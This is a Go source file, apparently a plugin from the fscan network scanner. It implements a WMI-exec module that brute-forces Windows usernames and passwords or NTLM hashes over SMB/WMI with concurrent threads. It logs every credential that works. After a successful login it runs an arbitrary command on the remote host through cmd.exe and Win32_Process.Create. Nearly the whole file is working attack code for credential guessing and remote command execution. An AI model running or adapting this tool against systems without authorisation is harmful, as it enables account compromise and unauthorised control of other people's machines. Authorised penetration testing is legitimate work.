package Plugins

import (
	"fmt"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"github.com/shadow1ng/fscan/Common"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	ClientHost string
	flag       bool
)

func init() {
	if flag {
		return
	}
	clientHost, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	ClientHost = clientHost
	flag = true
}

func WmiExec(info *Common.HostInfo) (tmperr error) {
	if Common.DisableBrute {
		return nil
	}

	maxRetries := Common.MaxRetries
	threads := Common.BruteThreads

	taskChan := make(chan struct {
		user string
		pass string
	}, len(Common.Userdict["smb"])*len(Common.Passwords))

	resultChan := make(chan error, threads)

	// 生成所有用户名密码组合任务
	for _, user := range Common.Userdict["smb"] {
		for _, pass := range Common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			taskChan <- struct {
				user string
				pass string
			}{user, pass}
			// 如果是32位hash值,只尝试一次密码
			if len(Common.HashValue) == 32 {
				break
			}
		}
	}
	close(taskChan)

	// 启动工作线程
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			starttime := time.Now().Unix()

			for task := range taskChan {
				// 重试循环
				for retryCount := 0; retryCount < maxRetries; retryCount++ {
					// 检查是否超时
					if time.Now().Unix()-starttime > int64(Common.Timeout) {
						resultChan <- fmt.Errorf("扫描超时")
						return
					}

					// 执行WMI连接
					done := make(chan struct {
						success bool
						err     error
					})

					go func(user, pass string) {
						success, err := Wmiexec(info, user, pass, Common.HashValue)
						done <- struct {
							success bool
							err     error
						}{success, err}
					}(task.user, task.pass)

					// 等待结果或超时
					var err error
					select {
					case result := <-done:
						err = result.err
						if result.success {
							// 成功连接
							var successLog string
							if Common.Domain != "" {
								successLog = fmt.Sprintf("[+] WmiExec %v:%v:%v\\%v ",
									info.Host, info.Ports, Common.Domain, task.user)
							} else {
								successLog = fmt.Sprintf("[+] WmiExec %v:%v:%v ",
									info.Host, info.Ports, task.user)
							}

							if Common.HashValue != "" {
								successLog += "hash: " + Common.HashValue
							} else {
								successLog += task.pass
							}
							Common.LogSuccess(successLog)
							resultChan <- nil
							return
						}
					case <-time.After(time.Duration(Common.Timeout) * time.Second):
						err = fmt.Errorf("连接超时")
					}

					// 处理错误情况
					if err != nil {
						errlog := fmt.Sprintf("[-] WmiExec %v:%v %v %v %v",
							info.Host, 445, task.user, task.pass, err)
						errlog = strings.Replace(errlog, "\n", "", -1)
						Common.LogError(errlog)

						// 检查是否需要重试
						if retryErr := Common.CheckErrs(err); retryErr != nil {
							if retryCount == maxRetries-1 {
								resultChan <- err
								return
							}
							continue // 继续重试
						}
					}

					break // 如果不需要重试，跳出重试循环
				}
			}
			resultChan <- nil
		}()
	}

	// 等待所有线程完成
	go func() {
		wg.Wait()
		close(resultChan)
	}()

	// 检查结果
	for err := range resultChan {
		if err != nil {
			tmperr = err
			if retryErr := Common.CheckErrs(err); retryErr != nil {
				return err
			}
		}
	}

	return tmperr
}

func Wmiexec(info *Common.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	return WMIExec(target, user, pass, hash, Common.Domain, Common.Command)
}

func WMIExec(target, username, password, hash, domain, command string) (flag bool, err error) {
	err = ole.CoInitialize(0)
	if err != nil {
		return false, err
	}
	defer ole.CoUninitialize()

	// 构建认证字符串
	var auth string
	if domain != "" {
		auth = fmt.Sprintf("%s\\%s:%s", domain, username, password)
	} else {
		auth = fmt.Sprintf("%s:%s", username, password)
	}

	// 构建WMI连接字符串
	connectStr := fmt.Sprintf("winmgmts://%s@%s/root/cimv2", auth, target)

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		return false, err
	}
	defer unknown.Release()

	wmi, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return false, err
	}
	defer wmi.Release()

	// 使用connectStr来建立连接
	service, err := oleutil.CallMethod(wmi, "ConnectServer", "", connectStr)
	if err != nil {
		return false, err
	}
	defer service.Clear()

	// 连接成功
	flag = true

	// 如果有命令则执行
	if command != "" {
		command = "C:\\Windows\\system32\\cmd.exe /c " + command

		// 创建Win32_Process对象来执行命令
		process, err := oleutil.CallMethod(service.ToIDispatch(), "Get", "Win32_Process")
		if err != nil {
			return flag, err
		}
		defer process.Clear()

		// 执行命令
		_, err = oleutil.CallMethod(process.ToIDispatch(), "Create", command)
		if err != nil {
			return flag, err
		}
	}

	return flag, nil
}
